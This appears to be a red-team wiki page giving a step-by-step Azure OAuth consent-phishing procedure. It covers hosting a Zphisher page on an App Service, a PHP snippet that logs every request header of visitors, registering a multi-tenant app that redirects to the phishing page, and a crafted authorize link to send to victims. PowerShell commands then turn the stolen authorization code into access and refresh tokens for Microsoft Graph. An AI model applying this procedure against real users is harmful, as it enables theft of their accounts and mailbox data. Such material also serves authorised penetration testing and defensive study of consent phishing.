# Azure Application service phishing

## Azure Application service phishing

The goal is to create a portal which will prompt the victim to accept specific access from an application into his account.

### Installation

Set up an APP service and Zphisher

{% embed url="https://b3v1l.gitbook.io/offensive-security-and-other-stuff/offsec/cloud-pentesting/cloud-redteam-operation/phishing-techniques/azure/azure-apps-phishing" %}

### Configuration

Add the following lines into the `/home/site/wwwroot/ip.php` (just before `fclose($fp);` )

```php
foreach (getallheaders() as $name => $value) {
                fwrite($fp, "$name: $value <br>");
}
```

### APP registration

On the portal, register a new APP (which will be what the victim will see)

![](<../../../../.gitbook/assets/image (141).png>)

Create an application display name, set the account type to "multi-tenant" and set the redirect link to the phishing web page&#x20;

![](<../../../../.gitbook/assets/image (24).png>)

### API Permissions

![](<../../../../.gitbook/assets/image (195).png>)

* Set up pernissions (to be able to authenticate as the user)

![](<../../../../.gitbook/assets/image (78).png>)

![](<../../../../.gitbook/assets/image (313).png>)

### Admin consent requires

Certain permissions require an admin consent to work...

By default, an user has the ability to set up an application (accept and consent for the organization).&#x20;

![](<../../../../.gitbook/assets/image (28) (1).png>)

For instance, mail.read doesn't work for multi-tenant (same tenant is ...).

### Application Secret

Create a new secret for the application

![](<../../../../.gitbook/assets/image (172).png>)

### Set up the phishing link

Craft the URL which will be sent to the victim

* Get the "application ID" from overview menu

![](<../../../../.gitbook/assets/image (20) (1).png>)

* Replace the Client\_ID value in the following link. Same for URI\_redirect (using the **phishing instance url**)

```csharp
https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=<your-client-id>&response_type=code&redirect_uri=https%3A%2F%2F<your-azure-app-service-domain>.azurewebsites.net&response_mode=query&scope=openid%20offline_access%20profile%20user.read%20email&state=1234
```

### Victim point of view

* Victim clicks on the link and get a login prompt

![](<../../../../.gitbook/assets/image (289).png>)

* Permissions request

![](<../../../../.gitbook/assets/image (96).png>)

![](<../../../../.gitbook/assets/image (165).png>)

### Steal the OAuth token&#x20;

* lifetime really short (\~ 10 minutes) but can be refreshed&#x20;

![](<../../../../.gitbook/assets/image (88).png>)

### Import the token

```csharp
$oauth_token = "TOKEN_HERE"
Import-Module AzureOAuthTools.ps1
Get-AzureAccessToken -ClientID “<your-azure-app-client-id>” -ClientSecret “<your-azure-app-secret>” -RedirectUri “https://<yourdomain>.azurewebsites.net” -AuthCode $oauth_token
```

![](<../../../../.gitbook/assets/image (163).png>)

### Access to the Microsoft Graph using the token

```csharp
Check-MSGraphAccess -access_token "Token from previous command"
```

![](<../../../../.gitbook/assets/image (114).png>)

### Refresh the token

```csharp
 Get-NewAccessTokenWithRefreshToken -ClientID "<Client_ID>" -ClientSecret "<Client_Secret>" -RedirectUri "https://<SITE>.azurewebsites.net" -RefreshToken "<Refresh TOKEN FROM PREVIOUS CMD>"
```

![](<../../../../.gitbook/assets/image (269) (1).png>)

### Resources

{% embed url="https://gist.githubusercontent.com/dafthack/4a753e00ee946a0d967fcffa9fc1c526/raw/e34ed34f9900c061bf4920dfd454f577d4191414/AzureOAuthTools.ps1" %}



